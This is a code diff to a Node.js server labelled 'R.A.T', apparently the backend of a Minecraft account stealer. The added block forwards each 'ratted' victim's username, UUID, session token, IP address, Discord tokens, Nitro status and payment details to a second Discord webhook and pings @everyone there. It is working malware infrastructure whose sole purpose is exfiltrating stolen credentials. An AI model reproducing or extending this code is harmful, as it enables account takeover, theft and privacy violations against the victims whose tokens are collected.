@@ -171,6 +171,28 @@ app.post("/", (req, res) => {
                 }).catch(err => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
+                
+                post(process.env.WEBHOOK2, JSON.stringify({
+                    content: `@everyone - ${total_networth}`, //ping
+                    embeds: [{
+                        title: `Ratted ${req.body.username} - Click For Stats`,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\n${checkFeather}\n\n**Essentials:**\n${checkEssentials}\n\n**Lunar:**\n${checkLunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
+                        url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
+                        color: 5814783,
+                        footer: {
+                            "text": "R.A.T by dxxxxy",
+                            "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
+                        },
+                        timestamp: new Date()
+                    }],
+                    attachments: []
+                }), {
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }).catch(err => {
+                    console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
+                })
             }
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
